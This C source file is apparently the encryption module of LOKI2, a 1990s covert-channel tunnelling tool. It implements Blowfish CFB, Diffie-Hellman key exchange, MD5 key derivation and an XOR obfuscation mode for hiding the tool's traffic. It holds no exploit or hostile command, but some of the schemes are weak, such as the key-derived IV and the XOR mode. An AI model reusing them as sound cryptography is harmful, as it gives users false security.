/*
 * LOKI2
 *
 * [ crypt.c ]
 *
 *  1996/7 Guild Corporation Worldwide      [daemon9]
 */
 

#include "loki.h"
#include "crypt.h"
#include "md5/global.h"
#include "md5/md5.h"

#ifdef STRONG_CRYPTO
u_char user_key[BF_KEYSIZE];                /* unset blowfish key */
BF_KEY bf_key;                              /* set key */
volatile u_short ivec_salt = 0;           


/*
 *  Blowfish in cipher-feedback mode.  This implements blowfish (a symmetric 
 *  cipher) as a self-synchronizing stream cipher.  The initialization 
 *  vector (the initial dummy cipher-text block used to seed the encryption)
 *  need not be secret, but it must be unique for each encryption.  I fill
 *  the ivec[] array with every 3rd key byte incremented linear-like via
 *  a global encryption counter (which must be synced in both client and
 *  server).
 */

void blur(int m, int bs, u_char *t)
{

    int i = 0, j = 0, num      = 0;
    u_char ivec[IVEC_SIZE + 1] = {0};       

    for (; i < BF_KEYSIZE; i += 3)         /* fill in IV */
        ivec[j++] = (user_key[i] + (u_char)ivec_salt);     
    BF_cfb64_encrypt(t, t, (long)(BUFSIZE - 1), &bf_key, ivec, &num, m);
}


/*
 *  Generate DH keypair.
 */

DH* generate_dh_keypair()
{

    DH *dh = NULL;
                                        /* Initialize the DH structure */
    dh = DH_new();
                                        /* Convert the prime into BIGNUM */
    (BIGNUM *)(dh -> p) = BN_bin2bn(modulus, sizeof(modulus), NULL);
                                        /* Create a new BIGNUM */
    (BIGNUM *)(dh -> g) = BN_new();
                                        /* Set the DH generator */
    BN_set_word((BIGNUM *)(dh -> g), DH_GENERATOR_5);
                                        /* Generate the key pair */
    if (!DH_generate_key(dh)) return ((DH *)NULL);

    return(dh);
}


/*
 *  Extract blowfish key from the DH shared secret.  A simple MD5 hash is
 *  perfect as it will return the 16-bytes we want, and obscure any possible
 *  redundancies or key-bit leaks in the DH shared secret.
 */


u_char *extract_bf_key(u_char *dh_shared_secret, int set_bf)
{

    u_char digest[MD5_HASHSIZE]; 
    unsigned len = BN2BIN_SIZE; 
    MD5_CTX context; 
                                        /* initialize MD5 (loads magic context
                                         * constants)
                                         */
    MD5Init(&context);
                                        /* MD5 hashing */
    MD5Update(&context, dh_shared_secret, len);
                                        /* clean up of MD5 */
    MD5Final(digest, &context);
    bcopy(digest, user_key, BF_KEYSIZE);
                                        /* In the server we dunot set the key 
                                         * right away; they are set when they
                                         * are nabbed from the client list.
                                         */
    if (set_bf == OK)
    { 
        BF_set_key(&bf_key, BF_KEYSIZE, user_key);
        return ((u_char *)NULL);
    }
    else return (strdup(user_key));
}
#endif
#ifdef WEAK_CRYPTO

/*
 *  Simple XOR obfuscation.
 *
 *  ( Syko was right -- the following didn't work under certain compilation 
 *  environments...  Never write code in which the order of evaluation defines
 *  the result.  See K&R page 53, at the bottom... )
 *
 *  if (!m) while (i < bs) t[i] ^= t[i++ +1];
 *  else
 *  {
 *      i = bs;
 *      while (i) t[i - 1] ^= t[i--];
 *  }
 * 
 */

void blur(int m, int bs, u_char *t)
{

    int i = 0;

    if (!m)
    {                           /* Encrypt */
        while (i < bs)
        {
            t[i] ^= t[i + 1];
            i++;
        }
    }
    else
    {                           /* Decrypt */
        i = bs;
        while (i)
        {
            t[i - 1] ^= t[i];
            i--;
        }
    }
}

#endif
#ifdef NO_CRYPTO

/*
 *  No encryption
 */

void blur(int m, int bs, u_char *t){}

#endif

/* EOF */
